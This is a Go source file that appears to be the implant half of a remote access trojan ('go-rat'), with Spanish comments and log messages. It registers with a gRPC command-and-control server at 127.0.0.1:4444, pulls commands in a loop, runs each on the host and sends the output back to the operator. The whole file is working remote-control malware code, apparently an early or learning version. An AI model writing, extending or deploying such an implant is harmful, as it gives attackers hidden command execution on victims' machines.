package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/charmbracelet/log"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err = grpc.NewClient("127.0.0.1:4444", opts...)
	if err != nil {
		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
	}
	defer conn.Close()

	client = grpcapi.NewImplantClient(conn)
	ctx := context.Background()
	identity := new(grpcapi.Identity)

	if len(os.Args) == 2 {
		identity.Name = os.Args[1]
	}

	identity, err = client.RegisterImplant(ctx, identity)
	if err != nil {
		log.Warn("Hubo un error al registrar el implant")
		log.Error("", "Error", err.Error())
		return
	}
	for {
		cmd, err := client.FetchCommand(ctx, identity)
		// log a eliminar

		a, ok := status.FromError(errors.New("channel closed"))
		if ok {
			log.Info(a)
			return
		}
		if err != nil && err.Error() == a.Err().Error() {
			log.Debug("hey")
			return
		}
		// TODO: Comparar el tipo de error, si al recibir
		if err != nil {
			fmt.Println(err)
			fmt.Println(err.Error())
			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
		}
		if cmd.In == "" {
			time.Sleep(1000)
			continue
		} else {
			log.Debug("[+] Comando recibido del servidor.", "CMD", cmd.In)
		}
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) >= 1 {
			if tokens[0] == "exit" {
				os.Exit(0)
			}
			if len(tokens) == 1 {
				c = exec.Command(tokens[0])
			} else {
				c = exec.Command(tokens[0], tokens[1:]...)
			}
		}
		// Cambiar en un futuro a stderr y stdout
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		_, err = client.SendOutput(ctx, cmd)
		if err != nil {
			log.Fatal(err)
		}
		log.Debug("[*] Resultado enviado al administrador.")
	}
}
